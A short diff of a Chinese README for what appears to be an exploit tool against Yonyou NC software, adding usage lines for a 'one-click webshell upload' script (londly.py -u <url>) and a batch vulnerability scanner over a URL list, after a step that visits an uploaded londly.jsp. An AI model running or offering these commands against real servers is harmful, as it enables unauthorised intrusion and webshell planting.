@@ -36,7 +36,15 @@ Content-Type: image/png
 访问 http://xxxxxxxxxxxx/londly.jsp  
 
 ## 0x02 python利用脚本
+
+       一键上传webshell脚本
         
-        https://github.com/Londly01/yongyou-nc-exp
+        python.exe londly.py -u http://xxxx
+        
+        
+        批量漏洞检测脚本
+        
+        python.exe nccheck.py -f url.txt
+        
   
    
